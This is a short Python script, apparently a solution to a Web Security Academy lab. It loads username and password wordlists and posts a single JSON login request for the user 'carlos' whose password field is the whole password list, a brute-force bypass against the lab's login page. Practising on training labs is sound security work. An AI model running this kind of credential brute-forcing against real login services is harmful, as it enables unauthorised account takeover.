

import requests
import random
import json

fd = open('usernames.txt','r')
wordlist = fd.read()
fd.close()

usernames = list(wordlist.split('\n'))
#print(usernames)

fd = open('passwords.txt','r')
wordlist = fd.read()
fd.close()

passwords = list(wordlist.split('\n'))
#print(passwords)



#print(json.dumps(passwords))


url = "https://acd41fd11e7d50efc05f159700a0004b.web-security-academy.net/login"


data2 = {
	"username":"carlos",
	"password":passwords
}

r = requests.post(url,data=json.dumps(data2))
print(r.text)

